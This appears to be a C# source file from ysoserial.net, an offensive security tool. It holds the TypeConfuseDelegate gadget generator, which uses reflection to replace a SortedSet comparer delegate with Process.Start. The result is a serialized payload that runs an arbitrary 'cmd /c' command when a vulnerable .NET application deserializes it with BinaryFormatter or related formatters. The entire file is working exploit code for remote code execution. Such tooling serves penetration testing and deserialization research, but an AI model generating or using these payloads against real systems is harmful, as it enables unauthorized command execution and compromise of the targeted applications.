using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace ysoserial_frmv2.Generators
{
    class TypeConfuseDelegateGenerator : GenericGenerator
    {
        public override string Name()
        {
            return "TypeConfuseDelegate";
        }

        public override string Description()
        {
            return "TypeConfuseDelegate gadget by James Forshaw";
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "NetDataContractSerializer", "LosFormatter" };
        }

        public override object Generate(string cmd, string formatter, Boolean test)
        {
            return Serialize(TypeConfuseDelegateGadget(cmd), formatter, test);
        }

        /* this can be used easily by the plugins as well */
        public object TypeConfuseDelegateGadget(string cmd)
        {
            if (File.Exists(cmd))
            {
                Console.Error.WriteLine("Reading command from file " + cmd + " ...");
                cmd = File.ReadAllText(cmd);
            }
            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add("cmd");
            set.Add("/c " + cmd);

            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            // Modify the invocation list to add Process::Start(string, string)
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);

            return set;
        }

    }
}